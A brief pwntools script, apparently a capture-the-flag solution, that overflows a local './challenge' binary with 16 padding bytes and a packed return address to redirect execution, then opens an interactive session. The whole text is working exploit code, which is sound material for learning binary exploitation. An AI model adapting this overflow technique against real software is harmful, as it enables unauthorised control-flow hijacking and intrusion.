from pwn import *

p = process("./challenge")

p.sendline(b"A"*16 + p64(0x401156))

p.interactive()
